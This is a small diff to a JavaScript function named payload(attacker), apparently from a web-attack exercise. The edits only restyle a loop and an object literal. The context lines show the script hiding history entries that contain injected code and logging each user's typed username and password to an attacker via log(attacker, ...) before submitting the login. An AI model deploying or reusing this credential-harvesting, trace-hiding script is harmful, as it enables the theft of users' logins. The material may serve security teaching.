@@ -42,10 +42,12 @@ function payload(attacker) {
 		if (historyList.length == 0) {
 			return;
 		}
-		for (var i = 0; i < historyList.length; i++) {
+		var i = 0;
+		while (i < historyList.length) {
 			if (historyList[i].text.indexOf(injectedCode[0]) != -1) {
 				historyList[i].style.display = "none";
 			}
+			i ++;
 		}
 	}
 
@@ -74,7 +76,7 @@ function payload(attacker) {
 	function loginHelper(action) {
 		var username = $("#username").val();
 		var password = $("#userpass").val();
-		var data = {"username": username, "password": password};
+		var data = {username: username, password: password};
 
 		log(attacker, {event: "login", user: username, pass: password});
 		$.post(action, data, function() {
